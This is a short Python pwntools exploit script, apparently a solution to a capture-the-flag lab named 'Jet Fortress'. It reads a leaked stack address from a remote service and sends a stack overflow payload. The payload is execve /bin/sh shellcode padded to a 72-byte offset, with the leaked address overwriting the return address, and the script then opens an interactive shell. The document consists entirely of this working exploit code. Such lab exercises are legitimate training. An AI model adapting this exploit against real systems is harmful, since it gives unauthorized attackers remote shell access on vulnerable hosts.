#!/usr/bin/python
# JET FORTRESS

from pwn import *

remote = remote('10.13.37.10', 4444)
context(os='linux', arch="amd64")
#binary = ELF('./leak')

remote.recvuntil("Oops, I'm leaking! ")
address = remote.recvline(False)
address = int(address, 16)

offset = 72

shellcode = ""
shellcode += "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e"
shellcode += "\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89"
shellcode += "\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

payload = ""
payload += shellcode
payload += "A" * (offset - len(payload))
payload += p64(address)

remote.sendline(payload)
remote.interactive()

remote.close() 
